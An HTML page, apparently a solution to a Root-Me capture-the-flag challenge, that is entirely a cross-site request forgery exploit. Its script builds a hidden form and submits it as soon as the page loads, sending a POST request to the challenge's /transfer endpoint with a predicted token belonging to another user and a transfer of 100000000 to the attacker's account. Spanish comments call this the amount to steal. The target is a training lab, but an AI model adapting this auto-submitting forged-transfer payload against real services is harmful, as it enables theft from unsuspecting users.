<!DOCTYPE html>
<html>
<body>
    <script>
        // Usamos un formulario dinámico para asegurar el envío
        var b = document.createElement("form");
        b.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
        b.method = "POST";
        
        // Datos del ataque
        var fields = {
            "token": "6594d3fb4300bf02000000", // Token predicho de the_dwalt00ns
            "recipient": "test",             // TU usuario
            "amount": "100000000"           // Cantidad a robar
        };

        for (var key in fields) {
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = key;
            input.value = fields[key];
            b.appendChild(input);
        }

        document.body.appendChild(b);
        b.submit();
    </script>
</body>
</html>
